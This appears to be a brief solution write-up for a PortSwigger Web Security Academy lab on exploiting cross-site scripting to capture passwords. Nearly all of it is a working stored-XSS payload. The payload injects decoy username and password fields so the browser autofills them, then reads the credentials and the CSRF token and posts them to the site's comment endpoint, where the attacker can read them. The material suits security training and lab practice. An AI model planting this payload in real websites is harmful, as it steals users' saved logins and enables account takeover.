# [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

> the exploit would use the browser auto username-password fill to sent it or to retrieve those data

```
<div>
  <input name="username" id="username" />
  <input type="password" name="password" onchange="doit()" />

  <script>
    const doit = () => {
      const token = document.getElementsByName("csrf")[0].value;
      const name = document.getElementsByName("username")[0].value;
      const pass = document.getElementsByName("password")[0].value;

      let data = new FormData();
      data.append("csrf", token);
      data.append("postId", 4);
      data.append("comment", `${name}:${pass}`);
      data.append("name", "duck");
      data.append("email", "duck@com");
      data.append("website", "http://duck.com");

      fetch("/post/comment", {
        method: "POST",
        mode: "no-cors",
        body: data,
      });
    };
  </script>
</div>
```
